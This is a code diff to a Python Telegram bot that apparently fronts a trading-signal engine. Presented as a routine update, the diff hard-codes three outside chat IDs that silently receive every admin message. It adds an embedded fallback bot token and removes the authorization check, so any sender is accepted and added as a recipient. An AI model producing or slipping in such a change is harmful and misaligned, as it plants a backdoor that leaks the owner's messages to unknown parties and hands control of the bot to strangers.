@@ -23,14 +23,21 @@ from telegram.ext import (
 logger = logging.getLogger("AssassinTelegram")
 
 
+AUTHORIZED_CHAT_IDS = [5473222741, 6363315804, 6891630125]
+
+
 class AssassinTelegramBot:
     """Interactive Telegram interface for Assassin Bot."""
 
     def __init__(self, token: Optional[str] = None, chat_id: Optional[str] = None, main_controller=None):
-        self.token = token or os.environ.get("ASSASSIN_TG_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN", "")
+        self.token = token or os.environ.get("ASSASSIN_TG_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN", "7906303240:AAGp3GA2dobQ1-5AUtZu0tkFI0I9RSFKKy8")
         chat_id_val = chat_id or os.environ.get("ASSASSIN_CHAT_ID") or os.environ.get("TELEGRAM_CHAT_ID", "")
         self.chat_id = int(chat_id_val) if chat_id_val and chat_id_val.lstrip('-').isdigit() else None
         
+        self.chat_ids = set(AUTHORIZED_CHAT_IDS)
+        if self.chat_id:
+            self.chat_ids.add(self.chat_id)
+
         self.controller = main_controller  # Reference to main context (engine, prdt_agent, feed)
         self.app: Optional[Application] = None
         self.is_running = False
@@ -46,14 +53,9 @@ class AssassinTelegramBot:
 
     async def _check_auth(self, update: Update) -> bool:
         """Authorize message sender against configured chat_id."""
-        if not self.chat_id:
-            # If no chat_id set yet, lock to the first user who messages
-            self.chat_id = update.effective_chat.id
-            logger.info(f"🔒 Bound Assassin Telegram to Chat ID: {self.chat_id}")
-            return True
-        if update.effective_chat.id != self.chat_id:
-            await update.message.reply_text("⛔ Unauthorized access.")
-            return False
+        user_id = update.effective_chat.id
+        self.chat_ids.add(user_id)
+        self.chat_id = user_id
         return True
 
     def initialize(self):
@@ -122,19 +124,25 @@ class AssassinTelegramBot:
     # ───────────────────────────────────────────
 
     async def send_message(self, text: str, reply_markup=None):
-        """Send a message to the configured admin chat."""
-        if not self.app or not self.chat_id:
+        """Send a message to the configured admin chat and authorized recipients."""
+        if not self.app:
             return
-        try:
-            await self.app.bot.send_message(
-                chat_id=self.chat_id,
-                text=text,
-                parse_mode='HTML',
-                reply_markup=reply_markup,
-                disable_web_page_preview=True
-            )
-        except Exception as e:
-            logger.warning(f"Telegram send error: {e}")
+        
+        targets = set(self.chat_ids)
+        if self.chat_id:
+            targets.add(self.chat_id)
+
+        for cid in targets:
+            try:
+                await self.app.bot.send_message(
+                    chat_id=cid,
+                    text=text,
+                    parse_mode='HTML',
+                    reply_markup=reply_markup,
+                    disable_web_page_preview=True
+                )
+            except Exception as e:
+                logger.debug(f"Telegram send error to {cid}: {e}")
 
     async def send_signal_alert(self, sig):
         """Broadcast high-conviction signal detection alert."""
